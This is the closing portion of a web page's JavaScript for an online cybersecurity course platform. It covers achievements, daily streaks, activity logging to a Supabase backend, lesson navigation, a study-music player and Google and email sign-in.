          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
       await supabase.rpc('increment_profile_counter', {
  user_id_param: currentUser.id,
  counter_field: counterType,
  increment_value: 1
});

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo:
                window.location.origin +
                "/courses/xss-attacks-roadmap.html",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>

